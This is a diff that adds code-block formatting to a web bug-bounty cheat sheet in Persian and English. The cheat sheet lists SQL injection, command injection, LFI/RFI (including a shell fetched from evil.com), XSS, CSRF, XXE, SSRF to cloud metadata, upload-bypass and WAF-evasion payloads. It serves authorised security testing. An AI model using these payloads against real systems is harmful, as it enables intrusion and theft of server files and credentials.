@@ -104,50 +104,52 @@ Request Smuggling: چطور درخواست‌های HTTP مخلوط میشن و 
 
 Enumerate endpointها از طریق:
 
+```
 Tools: gau, waybackurls, assetfinder, amass
-
+```
 پارامترهای رایج:
 
+```
 id, user_id, account, order, uid, pid, cid, file, doc, download
-
+```
 
 نمونه endpoint حساس:
-
+```
 /api/v1/users?id=123
 /download?file=report.pdf
 /orders/view/123
-
+```
 
 Payload تست LFI:
-
+```
 ../../../../etc/passwd
-
+```
 فصل ۳: تزریق‌های سمت سرور (Server-Side Injection)
 
 SQL Injection:
 پارامترهای حساس: id, user, q, search, page
 
 Payload:
-
+```
 ' OR '1'='1 --
 1' UNION SELECT null,version(),database() --
-
+```
 
 Command Injection:
-
+```
 Endpoint مشکوک: /ping?host=8.8.8.8
-
+```
 Payload:
-
+```
 8.8.8.8; cat /etc/passwd
 && whoami
-
+```
 فصل ۴: تزریق سمت کاربر (Client-Side Injection – XSS)
 
 Reflected XSS:
-
+```
 /search?q=<script>alert(1)</script>
-
+```
 
 Stored XSS: در فرم‌های کامنت، پروفایل، پیام خصوصی
 
@@ -156,78 +158,78 @@ DOM XSS: در JS فایل‌ها (location.hash, document.write)
 فصل ۵: CSRF (Cross-Site Request Forgery)
 
 نمونه PoC:
-
+```
 <form action="https://target.com/change_email" method="POST">
   <input type="hidden" name="email" value="attacker@mail.com">
   <input type="submit">
 </form>
-
+```
 
 تست روی Endpointهای حساس:
-
+```
 /change_password
 
 /update_email
 
 /transfer_money
-
+```
 فصل ۶: حملات فایل سیستم
 
 تست LFI/RFI روی پارامترهای file, path, template:
-
+```
 file=../../../../etc/passwd
 file=http://evil.com/shell.txt
-
+```
 
 Upload bypass: آپلود فایل با تغییر mime-type یا double extension:
-
+```
 shell.php;.jpg
-
+```
 فصل ۷: Authentication & Authorization
 
 تست روی:
-
+```
 /login, /reset_password, /oauth, /sso
-
+```
 پارامترهای حساس:
-
+```
 token, reset, otp, session, sid, auth
-
+```
 
 مثال IDOR:
-
+```
 GET /api/v1/orders/123   → تغییر به 124
-
+```
 فصل ۸: باگ‌های منطق تجاری
 
 تست محدودیت‌ها: تعداد دفعات درخواست OTP، اعمال کوپن تخفیف، محدودیت پرداخت
 
 مثال:
-
+```
 /apply_coupon?code=DISCOUNT100
-
+```
 
 تست کن چند بار میشه استفاده کرد؟
 
 فصل ۹: XXE / SSRF / Request Smuggling
 
 XXE Payload:
-
+```
 <?xml version="1.0"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <data>&xxe;</data>
-
+```
 
 SSRF Payload:
-
+```
 url=http://127.0.0.1:22
 url=http://169.254.169.254/latest/meta-data/
-
+```
 
 Request Smuggling: تست روی هدرها:
-
+```
 Content-Length / Transfer-Encoding
-
+```
 فصل ۱۰: Attacking Serialization
 
 تست روی پارامترهایی که base64 یا object serialization دارن (data=eyJ1c2VyIjogIjEyMyJ9)
@@ -237,22 +239,22 @@ Content-Length / Transfer-Encoding
 فصل ۱۱: تست وب‌سرویس‌ها و Cloud
 
 APIها:
-
+```
 /api/v1/users
 /graphql
 /swagger.json
-
+```
 
 تست Rate Limit و Broken Object Level Authorization (BOLA)
 
 فصل ۱۲: حمله به HTML5
-
+```
 Storage Attacks: localStorage, sessionStorage
-
+```
 WebSocket Injection:
-
+```
 ws://target.com/chat
-
+```
 
 تست payload مشابه XSS یا SQL داخل پیام‌ها
 
@@ -261,11 +263,11 @@ ws://target.com/chat
 تکنیک‌ها:
 
 تغییر حروف: <ScRiPt>
-
+```
 استفاده از encoding: %3Cscript%3Ealert(1)%3C/script%3E
 
 تغییر متد: POST → GET
-
+```
 فصل ۱۴: نوشتن گزارش (Report Writing)
 
 ساختار: Title → Description → Steps to Reproduce → Impact → Recommendation → Evidence
@@ -298,79 +300,81 @@ ws://target.com/chat
 - [ ] Burp Intruder → fuzz parameters
 
 **Payloads:**
-```sql
+```
+sql
 ' OR 1=1--
 1' UNION SELECT null, version(), database()--
 **
 ```
 
 Command Injection
-
+```
  Params like host, ip, cmd
 
  Try chaining with ;, &&, |
 
 8.8.8.8; whoami
 127.0.0.1 && cat /etc/passwd
-
+```
 3. Client-Side Injection
 XSS
-
+```
  Reflected: /search?q=<script>alert(1)</script>
 
  Stored: profile, comments, messages
 
  DOM: look at JS files for document.write, innerHTML
-
+```
 Payloads:
-
+```
 "><script>alert(1)</script>
 <img src=x onerror=alert(1)>
-
+```
 4. CSRF
-
+```
  Sensitive endpoints: /change_email, /reset_password, /transfer_money
-
+```
  Test without CSRF token
 
  SameSite & Referer checks bypass?
 
 PoC Template:
-
+```
 <form action="https://target.com/change_email" method="POST">
   <input type="hidden" name="email" value="attacker@mail.com">
   <input type="submit">
 </form>
-
+```
 5. File System Attacks
 LFI/RFI
-
+```
  Params: file, path, template
-
+```
+```
 ../../../../etc/passwd
 http://evil.com/shell.txt
-
+```
 File Upload
-
+```
  Double extension: shell.php;.jpg
-
+```
  MIME type tampering
 
 6. Auth & Access Control
 Broken Auth
-
+```
  Test /login, /reset, /sso
-
+```
  Reuse old tokens
 
  Session fixation
 
 IDOR
-
+```
  Change id=123 → 124
 
  Test on /orders/123, /api/v1/users/1
-
+```
 Burp Actions:
 
 Use Autorize plugin with low-privilege token
@@ -387,13 +391,15 @@ Compare responses with high-priv account
 
 8. XXE / SSRF / Smuggling
 XXE
+```
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <root>&xxe;</root>
-
+```
 SSRF
+```
 url=http://127.0.0.1:22
 url=http://169.254.169.254/latest/meta-data/
-
+```
 Request Smuggling
 
  Test Content-Length vs Transfer-Encoding
@@ -405,13 +411,13 @@ Request Smuggling
  Look for Base64 / serialized objects
 
  Test with ysoserial payloads
-
+```
  Example param: data=eyJ1c2VyIjogIjEyMyJ9
-
+```
 10. API & Cloud
-
+```
  Enumerate /api/v1/*, /graphql, /swagger.json
-
+```
  Test for BOLA (Broken Object Level Auth)
 
  Rate-limit bypass
@@ -423,15 +429,15 @@ Request Smuggling
  WebSocket fuzzing with XSS/SQL payloads
 
 12. WAF Evasion
-
+```
  Encode payloads: %3Cscript%3Ealert(1)%3C/script%3E
-
+```
  Change casing: <ScRiPt>
-
+```
  Try different HTTP verbs: PUT, OPTIONS
-
+```
 13. Reporting
-
+```
  Title (clear + vuln type)
 
  Description of vuln
@@ -443,11 +449,12 @@ Request Smuggling
  Recommendation (fix guidance)
 
  Evidence (screenshots, PoC)
-
+```
 🎯 Pro Burp Suite Setup
 
 Extensions to install:
 
+```
 Logger++ (monitor)
 
 Autorize (access control testing)
@@ -458,6 +465,7 @@ Collaborator Everywhere (OOB detection)
 
 Turbo Intruder (fast brute-force/fuzzing)
 
+```
 
 ===============================================================================
 ===============================================================================
